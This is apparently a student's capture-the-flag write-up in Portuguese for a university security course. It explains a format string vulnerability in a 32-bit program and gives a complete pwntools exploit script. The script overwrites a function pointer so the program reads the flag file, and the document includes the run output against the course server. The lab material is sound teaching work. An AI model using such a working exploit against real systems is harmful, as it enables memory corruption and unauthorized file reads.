# CTF Semana #6 (Format Strings)

Output do `checksec`: 

```bash
[11/15/24]seed@VM:~/.../ctf6$ checksec program
[*] '/home/seed/Downloads/ctf6/program'
    Arch:       i386-32-little
    RELRO:      No RELRO
    Stack:      Canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x8048000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
    Debuginfo:  Yes
```

É possível reparar que o executável tem arquitectura x86 (mas 32 bits), aparentemente existe um canário (no CTF anterior era dada indicação que havia apesar de não existir, mas neste CTF também não foi relevante), não sabemos se a stack tem permisssão de execução (NX), `as posições do binário não estão randomizadas (PIE)` e por fim existem regiões de memória com permissões de leitura, escrita e execução (RWX). O RELRO é uma mitigação adicional contra ataques ROP e também não é importante para este contexto. 

Depois de analisar o código-fonte, verificou-se que a vulnerabilidade (format string vulnerability) encontra-se na **linha 33** - `printf(buffer)`, onde o conteúdo do buffer (99 bytes) é dado pelo utilizador na linha 31 - scanf("%99s", &buffer). Explorando esta vulnerabilidade é possível controlar o ficheiro que é lido pelo programa.  

Inicialmente o programa exibe o conteúdo do ficheiro `rules.txt`, através da função `readtxt` que executa o comando `cat rules.txt`. O objetivo é tomar o controlo do programa de modo a chamar novamente a função `readtxt` para executar `cat flag.txt` (ou `cat ./flag.txt` como iremos ver mais à frente).

Em primeiro lugar, é necessário construir um payload em vista a alterar o pointer `fun` para o endereço de `readtxt` - `fun = &readtxt`. Para auxiliar nesta tarefa utilizou-se a função [fmtstr_payload()](https://docs.pwntools.com/en/stable/fmtstr.html#pwnlib.fmtstr.fmtstr_payload) 

```python
payload1 = fmtstr_payload(1, {fun_address: readtxt_address})
```
O primeiro argumento é `offset` = 1 ("the first formatter’s offset you control"). Este valor pode ser confirmado dando como input um determinado valor e uma sequência de `%x`, tal como no guião. `fun_address` é impresso pelo programa na linha 28 - printf("I will give you an hint: %x\n",&fun). `readtxt_address` pode ser obtido com o GDB tal como já foi feito no CTF anterior e nos guiões.

```bash
gdb-peda$ p fun
$1 = (void (*)(char *)) 0x80497a5 <readtxt>
```

Podemos confirmar que agora a função chamada é a `readtxt` cujo endereço é 0x80497a5. O programa imprime a função que é chamada na linha 34 printf("Calling function at %x %d\n",*fun,*fun).

```bash
[11/15/24]seed@VM:~/.../ctf6$ python3 exploit-template.py 
[+] Starting local process './program': pid 5713
Hint line: ffd45580

[+] Receiving all data: Done (1.29KB)
[*] Process './program' stopped with exit code 0 (pid 5713)
Try to unlock the flag:
       %                                                                                                                                                            1                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 haa\x83U\xd4\xff\x80U\xd4\xff\x81U\xd4\xffCalling function at 80497a5 134518693
Running command cat %8c%10.txt
cat: %8c%10.txt: No such file or directory
```

Em segundo lugar, é necessário tratar do argumento `name` da função `readtxt`, neste momento o comando executado é `Running command cat %8c%10.txt`. Analisando essa função reparou-se que são copiados `6 bytes` do argumento para construir o comando. Tendo isso em conta, apenas `"flag"` não iria funcionar (são apenas 4 bytes), mas é possível contornar esta questão acrescentado `"./"` no início, ficando `"./flag"` que será colocado no início do `buffer`. O payload acima é atualizado para:

```python
payload2 = b"./flag%c%c%c" + fmtstr_payload(4, {fun_address: 0x80497a5}, numbwritten=9)
```

Este payload funciona, porque estamos a escrever 12 chars/bytes com "./flag%c%c%c" e a ler 4*3 = 12 bytes com os 3 %c. Isto é importante porque a função fmtstr_payload assume que está no início do payload malicioso. O `offset` é atualizado e acrescenta-se `numbwritten` ("number of byte already written by the printf function").

- exploit-template.py

```python
#!/usr/bin/python3
from pwn import *

r = remote('ctf-fsi.fe.up.pt', 4005)
#r = remote('127.0.0.1', 4005)
#r = process('./program')

context(arch='i386')

#res = r.recvuntil(b"flag:\n")
#print(res)

res = r.recvuntil(b"hint: ")
hint_line = r.recvline().decode()
print("Hint line:", hint_line)

fun_address_match = re.search(r"[0-9a-fA-F]+", hint_line)
if fun_address_match:
    fun_address = int(fun_address_match.group(), 16)
#    print("Address of fun:", hex(fun_address))
else:
#    print("Failed to extract the address of fun.")
    exit()

# payload1 = fmtstr_payload(1, {fun_address: 0x80497a5})
payload2 = b"./flag%c%c%c" + fmtstr_payload(4, {fun_address: 0x80497a5}, numbwritten=9)

r.sendline(payload2)

buf = r.recvall().decode(errors="backslashreplace")
print(buf)
```

```bash
[11/15/24]seed@VM:~/.../ctf6$ python3 exploit-template.py 
[+] Starting local process './program': pid 5752
Hint line: ff9f7c50

[+] Receiving all data: Done (1.37KB)
[*] Process './program' stopped with exit code 0 (pid 5752)
Try to unlock the flag:
./flag.a%                                                                                                                                                           %                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 c                                                                                                                $P|\x9f\xffQ|\x9f\xffS|\x9f\xffCalling function at 80497a5 134518693
Running command cat ./flag.txt
flag{asd}

[11/15/24]seed@VM:~/.../ctf6$ python3 exploit-template.py 
[+] Opening connection to ctf-fsi.fe.up.pt on port 4005: Done
Hint line: ff981830

[+] Receiving all data: Done (1.40KB)
[*] Closed connection to ctf-fsi.fe.up.pt port 4005
Try to unlock the flag:
flag{L34k1ng_Fl4g_0ff_Th3_St4ck_44789C2D}
./flag.a%                                                                                                                                                           %                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 c                                                                                                                $0\x18\x98\xff1\x18\x98\xff3\x18\x98\xffCalling function at 80497a5 134518693
Running command cat ./flag.txt
```
